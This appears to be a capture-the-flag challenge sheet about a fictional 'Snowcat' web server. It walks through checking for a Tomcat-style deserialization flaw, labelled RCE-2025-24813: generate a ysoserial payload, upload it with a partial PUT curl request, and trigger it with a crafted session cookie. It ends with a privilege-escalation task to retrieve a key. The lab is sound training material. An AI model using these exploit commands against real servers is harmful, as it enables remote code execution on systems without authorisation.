# Remote Code Execution exploiting RCE-2025-24813

Snowcat is a webserver adapted to life in the arctic.
Can you help me check to see if Snowcat is vulnerable to RCE-2025-24813 like its cousin Tomcat?

## Display ysoserial help, lists payloads, and their dependencies:
```
  java -jar ysoserial.jar
```

## Identify what libraries are used by the Neighborhood Weather Monitoring system

## Use ysoserial to generate a payload

Store payload in file named payload.bin

## Attempt to exploit RCE-2025-24813 to execute the payload

```
export HOST=TODO_INSERT_HOST
export PORT=TODO_INSERT_PORT
export SESSION_ID=TODO_INSERT_SESSION_ID

curl -X PUT \
  -H "Host: ${HOST}:${PORT}" \
  -H "Content-Length: $(wc -c < payload.bin)" \
  -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" \
  --data-binary @payload.bin \
  "http://${HOST}:${PORT}/${SESSION_ID}/session"

curl -X GET \
  -H "Host: ${HOST}:${PORT}" \
  -H "Cookie: JSESSIONID=.${SESSION_ID}" \
  "http://${HOST}:${PORT}/"
```


# Privilege Escalation

The Snowcat server still uses some C binaries from an older system iteration.
Replacing these has been logged as technical debt.
<TOOD_INSERT_ELF_NAME> said he thought these components might create a privilege escalation vulnerability.
Can you prove these components are vulnerable by retrieving the key that is not used by the Snowcat hosted Neighborhood Weather Monitoring Station?